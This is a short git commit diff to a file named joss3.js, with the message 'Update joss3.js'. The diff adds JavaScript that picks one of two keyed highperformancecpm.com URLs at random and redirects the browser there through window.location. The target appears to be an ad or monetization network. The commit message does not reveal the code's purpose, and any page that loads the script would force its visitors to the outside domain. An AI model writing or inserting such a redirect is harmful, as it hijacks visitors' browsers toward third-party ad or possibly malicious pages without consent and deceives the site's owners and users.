fbaa4a8f442c7d0ccea556e7a07d3a918a5a822e
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-08-12 13:28:06 +0800

    Update joss3.js

--- joss3.js
+++ joss3.js
@@ -1,1 +1,10 @@
+var dataUrl = [
+  
+  'https://www.highperformancecpm.com/dc4j91c7v?key=9b2445d7fd2d084d5beb8e3db8d52fd5',
+  'https://www.highperformancecpm.com/uyh47i57?key=521dbcfa9c33f09f9006287ca4487e30'
+  
+  
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
 
